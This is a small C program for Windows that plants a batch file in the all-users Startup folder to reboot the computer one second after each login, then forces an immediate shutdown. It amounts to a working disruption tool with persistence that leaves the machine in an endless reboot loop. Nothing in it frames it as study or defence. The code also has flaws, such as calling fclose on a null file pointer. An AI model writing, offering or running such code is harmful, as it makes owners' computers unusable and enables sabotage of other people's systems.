#include <stdio.h>
#include <stdio.h>
#include <windows.h>

int main(int argc,char *argv) {
    FILE *check = fopen("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\copy.bat", "rb");
    if(!check){
        fclose(check);
        FILE *file1 = fopen("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\copy.bat", "wb");

        if(!file1){
            printf("Warning!You have to use administrator to use it.\n");
            system("PAUSE");
            return 1;
        }else{
            fprintf(file1,"shutdown -r -t 1 ");
            fclose(file1);
            system("shutdown -f -s -t 1");
        }
    }else{
        fclose(check);
        system("shutdown -f -s -t 1");
    }

    return 0;

}
